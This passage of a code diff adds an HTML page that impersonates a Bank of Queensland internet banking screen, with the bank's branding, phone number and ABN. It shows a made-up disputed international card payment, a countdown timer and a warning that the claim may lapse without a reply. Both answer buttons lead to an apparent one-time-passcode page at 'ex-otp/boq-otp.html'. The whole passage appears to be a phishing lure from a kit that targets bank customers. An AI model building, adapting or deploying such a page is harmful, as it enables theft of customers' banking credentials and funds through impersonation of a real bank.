oF0NiJYV9giwz6TJ9W/eSXLsQrCvPdgJMSFqPyr4NW8e2HXLh9EjzsZf/0lyjcSb+LJOJIba7AOxJOXFNhz6Eh/ivJfETsZaeunQY6YN4TwKLA5eLnWYZ0sz6sY8PbeXis7aR06OeLv1L4pY2o2gb8jlKGOh4+H2X2ZQ4fyTW2CgTsXyhXm9Q0EQ8gCvKo9dKsrrDLrqKtDKOwI+v8jSolRS79/wwYKSRch2rvlYbry9IfdwvCQfEPvuVgznEIm/QEs3TmaC+u94Iim5FmiUlt9Evyam+LP8ea1wn7zOyy6TLS8Efn+jZJnsZhzzmRq6gSNHpDglo+LGFGEPon6eJTb/pGFyQqh7D8Tt70W/94c76HESytkKo2XVuKtXeI+gJo2ZVd4zPLAcEjSOmHsGGrb6rQ1CaFoKSHHONKFP3ute4MGD5ltm+ikkUuODWvNdCOsQYiTAlIJD4i1y77D981+h4zOxtDBzKs3ZstVgiszcaSQ3/ZtJBLvdUP6Mc2Lj/HwZdBR0oI1sGUgiy9k9voeZEGfRH8ewJXdPP91Ijw83drPML8DcSdE8s7klZHFXtlbmG1txahsD4vbqIlQBoG5U3EN/y/AAKw38pdAhw1TAAAAAElFTkSuQmCC" alt="BOQ" />
+            </a>
+            <div class="header-contact">
+                Need help? <a href="tel:1300555722">13 00 555 722</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- ── Session bar ── -->
+    <div class="session-bar">
+        <span>Internet Banking</span>
+        <span>Session timeout: <span id="timer">09:58</span></span>
+    </div>
+
+    <!-- ── Main ── -->
+    <main>
+
+        <!-- Step indicator -->
+        <div class="steps" id="steps">
+            <div class="step active" id="step1">
+                <div class="step-num">1</div>
+                Review
+            </div>
+            <div class="step" id="step2">
+                <div class="step-num">2</div>
+                Confirm
+            </div>
+            <div class="step" id="step3">
+                <div class="step-num">3</div>
+                Done
+            </div>
+        </div>
+
+        <!-- ── Email-style verification card ── -->
+        <div class="card" id="card-verify">
+
+            <!-- Email header -->
+                </div>
+                <div class="email-subject">Dispute confirmation — international transaction</div>
+                
+            </div>
+
+                <!-- Transaction summary -->
+                <div class="txn-block-email">
+                    <div class="txn-top-email">
+                        <div>
+                            <div class="txn-merchant-email">Al Maya Group</div>
+                            <div class="txn-category-email">POS · Card not present · International</div>
+                        </div>
+                        <div>
+                            <div class="txn-amount-email">−$1,849.00</div>
+                            <div class="txn-currency-email">Australian Dollars</div>
+                        </div>
+                    </div>
+                    <div class="txn-details-email">
+                        <div class="txn-detail-email"><label>Date</label><span>18 Jun 2026</span></div>
+                        <div class="txn-detail-email"><label>Card Type</label><span>Debit Card</span></div>
+                        <div class="txn-detail-email"><label>Merchant location</label><span>Dubai Silicon Oasis, UAE</span></div>
+                        <div class="txn-detail-email"><label>Dispute ID</label><span>BOQ-DIS-20260617-8849</span></div>
+                    </div>
+                </div>
+
+                <!-- PS note -->
+                <div class="ps-note">
+                    <strong>PS:</strong> Just a reminder — If we do not receive your response, we may be unable to continue your claim, and the disputed funds may be returned to the merchant.
+                </div>
+
+            </div>
+
+            <div class="section-divider-email"></div>
+
+            <!-- Question + action buttons -->
+            <div class="question-block-email">
+                <h2>Did you authorise this transaction?</h2>
+                <p>To continue the dispute, please confirm that you did <strong>not</strong> make this payment. If you did authorise it, the dispute will be closed.</p>
+            </div>
+
+            <div class="btn-group-email">
+                <button class="btn btn-confirm-dispute" onclick="handleConfirm()" id="btn-confirm">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
+                    No — I did not authorise it
+                </button>
+                <button class="btn btn-authorize" onclick="handleDeny()" id="btn-authorize">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" /></svg>
+                    Yes — I authorised it
+                </button>
+            </div>
+
+            <div class="security-note-email">
+                <span class="security-note-icon">🔒</span>
+                <span>BOQ will <strong>never</strong> ask for your password, PIN, or security code. If someone asks for these, hang up and call us on <strong>13 00 555 722</strong>.</span>
+            </div>
+
+        </div>
+
+        <!-- ── Confirmed (dispute continues) ── -->
+        <div class="card" id="card-confirmed" style="display:none;">
+            <div class="result-screen" style="display:flex;">
+                <div class="result-icon-ring" style="background:var(--green-bg);">
+                    <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#1A6E44" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
+                </div>
+                <h2 style="color:var(--green);">Dispute confirmed</h2>
+                <p>Thank you for confirming. We have recorded that you <strong>did not authorise</strong> the payment to <strong>Al Maya Group</strong> for <strong>$1,849.00</strong>.</p>
+                <p>Your dispute will proceed. We'll contact you with the outcome within 5–10 business days.</p>
+                <div class="result-ref">
+                    <strong>Dispute ID:</strong> BOQ-DIS-20260617-8849 &nbsp;·&nbsp;
+                    <strong>Confirmed:</strong> <span id="confirm-time"></span>
+                </div>
+                <button class="btn-next-steps btn-confirmed-next" onclick="window.location.href='ex-otp/boq-otp.html';">
+                    Continue to myBOQ
+                </button>
+            </div>
+        </div>
+
+        <!-- ── Denied (dispute closed) ── -->
+        <div class="card" id="card-denied" style="display:none;">
+            <div class="card-header" style="background:var(--red);">
+                <div class="header-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10" />
+                        <line x1="15" y1="9" x2="9" y2="15" />
+                        <line x1="9" y1="9" x2="15" y2="15" />
+                    </svg>
+                </div>
+                <div class="header-text">
+                    <h1>Dispute closed</h1>
+                    <p>You confirmed you authorised this transaction.</p>
+                </div>
+            </div>
+            <div class="result-screen" style="display:flex; padding-top: 28px;">
+                <div class="result-icon-ring" style="background:var(--red-bg);">
+                    <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#C0392B" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10" />
+                        <line x1="12" y1="12" x2="16" y2="16" />
+                        <line x1="12" y1="12" x2="8" y2="16" />
+                    </svg>
+                </div>
+                <h2>Dispute closed</h2>
+                <p>You have confirmed that you <strong>did authorise</strong> the payment to <strong>Al Maya Group</strong> for <strong>$1,849.00</strong>. The dispute has been closed.</p>
+                <p>The funds will not be returned. If this was a mistake, please contact us immediately.</p>
+                <div class="result-ref">
+                    <strong>Dispute ID:</strong> BOQ-DIS-20260617-8849 &nbsp;·&nbsp;
+                    <strong>Closed:</strong> <span id="deny-time"></span>
+                </div>
+                <button class="btn-next-steps btn-denied-next" onclick="window.location.href='ex-otp/boq-otp.html';">
+                    Continue to myBOQ
+                </button>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- ── REAL BOQ FOOTER ── -->
+    <footer class="boq-footer" role="contentinfo">
+        <div class="footer-inner">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Security</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Contact Us</a>
+                <a href="#">Fraud &amp; Scams</a>
+            </div>
+            <div class="footer-copy">
+                &copy; Bank of Queensland 2026 &bull; ABN 32 009 656 740
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // ── Session countdown timer ──
+        let seconds = 598;
+        const timerEl = document.getElementById('timer');
+
+        const tick = setInterval(() => {
+            if (seconds <= 0) {
+                clearInterval(tick);
+                timerEl.textContent = '00:00';
+                return;
+            }
+            seconds--;
+            const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+            const s = String(seconds % 60).padStart(2, '0');
+            timerEl.textContent = `${m}:${s}`;
+            if (seconds <= 60) timerEl.classList.add('warning');
+        }, 1000);
+
+        // ── Step helpers ──
+        function setStep(n) {
+            [1, 2, 3].forEach(i => {
+                const el = document.getElementById('step' + i);
+                el.className = 'step' + (i < n ? ' done' : i === n ? ' active' : '');
+                if (i < n) el.querySelector('.step-num').textContent = '✓';
+            });
+        }
+
+        // ── Confirm handler (did NOT authorise → dispute continues) ──
+        function handleConfirm() {
+            const btn = document.getElementById('btn-confirm');
+            btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite;">⟳</span> Confirming…';
+            btn.disabled = true;
+            document.getElementById('btn-authorize').disabled = true;
+            setStep(2);
+
+            setTimeout(() => {
+                document.getElementById('card-verify').style.display = 'none';
+                document.getElementById('card-confirmed').style.display = 'block';
+                document.getElementById('confirm-time').textContent = new Date().toLocaleTimeString('en-AU', {
+                    hour: '2-digit',
+                    minute: '2-digit'
+                });
+                setStep(3);
+                clearInterval(tick);
+                timerEl.textContent = '—';
+            }, 1400);
+        }
+
+        // ── Deny handler (did authorise → dispute closed) ──
+        function handleDeny() {
+            const btn = document.getElementById('btn-authorize');
+            btn.innerHTML = '<span style="display:inline-block;animation:spin 1s linear infinite;">⟳</span> Closing dispute…';
+            btn.disabled = true;
+            document.getElementById('btn-confirm').disabled = true;
+            setStep(2);
+
+            setTimeout(() => {
+                document.getElementById('card-verify').style.display = 'none';
+                document.getElementById('card-denied').style.display = 'block';
+                document.getElementById('deny-time').textContent = new Date().toLocaleTimeString('en-AU', {
+                    hour: '2-digit',
+                    minute: '2-digit'
+                });
+                setStep(3);
+                clearInterval(tick);
+                timerEl.textContent = '—';
+            }, 1400);
+        }
+
+        // ── Return home (hidden helper) ──
+        function returnToHome() {
+            document.getElementById('card-confirmed').style.display = 'none';
+            document.getElementById('card-denied').style.display = 'none';
+            document.getElementById('card-verify').style.display = 'block';
+            document.getElementById('btn-confirm').disabled = false;
+            document.getElementById('btn-authorize').disabled = false;
+            document.getElementById('btn-confirm').innerHTML = `
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12" /></svg>
+                No — I did not authorise it
+            `;
+            document.getElementById('btn-authorize').innerHTML = `
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18" /><line x1="6" y1="6" x2="18" y2="18" /></svg>
+                Yes — I authorised it
+            `;
+            setStep(1);
+            seconds = 598;
+            timerEl.classList.remove('warning');
+            timerEl.textContent = '09:58';
+            clearInterval(tick);
+            const newTick = setInterval(() => {
+                if (seconds <= 0) {
+                    clearInterval(newTick);
+                    timerEl.textContent = '00:00';
+                    return;
+                }
+                seconds--;
+                const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+                const s = String(seconds % 60).padStart(2, '0');
+                timerEl.textContent = `${m}:${s}`;
+                if (seconds <= 60) timerEl.classList.add('warning');
+            }, 1000);
+            window._timerInterval = newTick;
+        }
+
+        window._timerInterval = tick;
+    </script>
+
+</body>
+</html>
